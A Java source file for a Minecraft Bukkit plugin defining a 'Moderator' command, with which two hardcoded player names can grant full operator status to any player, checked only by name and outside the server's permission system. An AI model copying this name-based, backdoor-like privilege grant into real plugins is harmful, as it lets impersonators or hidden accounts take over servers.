package teamzesa.command;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;
import teamzesa.resgisterEvent.EventExecutor;

import java.util.HashSet;
import java.util.Optional;
import java.util.Set;

public class Moderator implements CommandExecutor, EventExecutor {
    private Set<String> moderatorName;

    public Moderator() {
        this.moderatorName = new HashSet<>();
        moderList();
    }

    private void moderList() {
        moderatorName.add("JAXPLE");
        moderatorName.add("18_70015401");
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String @NotNull [] args) {
        if (args.length == 0)
            return false;

        if (checkupMod(sender))
            return false;

        Optional<Player> targetPlayer = Optional.ofNullable(Bukkit.getPlayer(args[0]));
        targetPlayer.ifPresent(player -> player.setOp(true));

        return true;
    }

    private boolean checkupMod(CommandSender sender) {
        return moderatorName.stream().noneMatch(name -> sender.getName().equals(name));
    }
}
